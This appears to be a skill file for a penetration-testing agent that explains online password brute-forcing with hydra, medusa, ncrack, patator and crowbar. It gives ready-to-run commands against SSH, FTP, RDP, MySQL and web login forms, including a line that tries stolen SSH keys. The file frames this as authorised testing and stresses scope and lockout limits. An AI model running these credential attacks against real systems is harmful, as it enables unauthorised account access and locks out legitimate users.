---
name: tools-hydra
description: >
  Run online password attacks against live services with hydra and its alternatives (medusa, ncrack,
  patator, crowbar) — service modules, http-post-form failure strings, thread tuning, resume, and
  lockout avoidance. Load when scope allows credential guessing against SSH/FTP/RDP/MySQL/web login
  forms and offline cracking is not an option. Signals: hydra -l -P, http-post-form, ^USER^ ^PASS^,
  ssh:// rdp:// mysql:// targets, medusa -M, ncrack, patator, login brute force.
domain: tools
type: technique
stability: learning
modes: [pentest, bugbounty]
severity: medium
mitre: [T1110.001]
tools: [hydra, medusa, ncrack, patator, crowbar]
schema_version: 1
---

# hydra & online password attacks

## When it applies
The engagement scope (`tradecraft-scope-roe`, `scope.txt`) explicitly permits online credential
guessing against a live service — SSH, FTP, RDP, MySQL, a web login form — and you have no hash to
crack offline (`tools-hashcat`). Online attacks are loud, slow, and lock accounts: check
`network-password-spraying` first — one password across many users is usually safer than many
passwords against one user.

## Why it works
Login services are oracles: every attempt returns success or failure. hydra/medusa/ncrack/patator
parallelize guesses across protocol modules and stop on the first valid pair. The whole craft is
(a) the right failure signal so you can tell "wrong password" from "wrong request", and (b) pacing
so you finish before the lockout policy finishes you.

## Method
1. **Get the failure signal from a real request first.** For web forms, capture one failed login in
   Burp and copy the exact POST body and a unique string from the failure page — guessing without
   this makes every attempt look like success.
2. **hydra basics:**
   ```bash
   hydra -l user -P wordlist.txt ssh://target_ip          # one user, password list
   hydra -L users.txt -P passwords.txt ftp://target_ip    # user list + password list
   hydra -l administrator -P wordlist.txt rdp://target_ip
   hydra -l root -P wordlist.txt mysql://target_ip
   hydra -t 4 -l user -P wordlist.txt ssh://target_ip     # -t = parallel tasks, keep low
   hydra -R                                                # resume an interrupted run
   ```
3. **Web form logins:**
   ```bash
   hydra -l admin -P wordlist.txt target_ip http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
   ```
   Format is `path:post-body:failure-string`; `^USER^`/`^PASS^` are the placeholders. The failure
   string must be text that appears *only* on failed logins.
4. **Alternatives when hydra misbehaves:**
   ```bash
   medusa -h target_ip -u admin -P passwords.txt -M ssh -t 4      # -f stops after first hit
   medusa -H hosts.txt -U users.txt -P pass.txt -M ssh -t 3 -T 5  # host list, 5 hosts in parallel
   ncrack -vv -U users.txt -P passwords.txt ssh://target_ip
   ncrack -iX nmap_scan.xml -U users.txt -P pass.txt              # targets straight from nmap XML
   patator ssh_login host=target_ip user=FILE0 password=FILE1 0=users.txt 1=passwords.txt
   patator http_fuzz url="https://target.com/login" method=POST body="user=FILE0&pass=FILE1" 0=users.txt 1=pass.txt -x ignore:fgrep="Login failed"
   crowbar -b rdp -s target_ip/32 -u admin -C passwords.txt -n 2  # RDP without NLA issues
   crowbar -b sshkey -s target_ip/32 -u root -k /path/to/keys/    # try stolen SSH keys
   ```
5. **Wordlists:** rockyou (`/usr/share/wordlists/rockyou.txt`) for broad guessing; SecLists
   (`/usr/share/seclists/Passwords/...`, `Usernames/top-usernames-shortlist.txt`) for focused lists.

## Gotchas
- **Account lockout is the default failure mode** — AD and many apps lock after 3–10 failures;
  throttle (`-t 2`, add delays), prefer spraying (`network-password-spraying`), and confirm the
  lockout policy in `roe.md` before the first attempt.
- **http-post-form false positives** — a wrong failure string (or a 302 on both success *and*
  failure) makes every guess "valid". Validate one known-bad and one known-good credential by hand
  before the run.
- **High thread counts break the target and the tool** — services drop connections, hydra reports
  phantom results; `-t 4` is a sane default for SSH, lower for RDP.
- **Tools disagree on modules** — medusa's `-M rdp`, crowbar's `-b rdp`, and hydra's rdp module
  handle NLA differently; if one errors out on modern RDP, switch to crowbar or xfreerdp-based
  checks.
- **Every attempt is logged** — source IPs in auth logs are trivially attributable; online guessing
  is a stated-scope activity, never an improvisation.

## Verify success
A credential pair validated by an actual login (ssh in, RDP session, authenticated web request) —
not just the tool's "found" line — plus a count of attempts made, so the report can state both the
result and the noise it took.

## References
THC-Hydra GitHub; medusa/ncrack/patator/crowbar docs. Offline path once you have hashes:
`tools-hashcat`; enterprise-safe alternative: `network-password-spraying`.

---
_Portions adapted from [reverse-skill](https://github.com/zhaoxuya520/reverse-skill) by zhaoxuya520, MIT License._
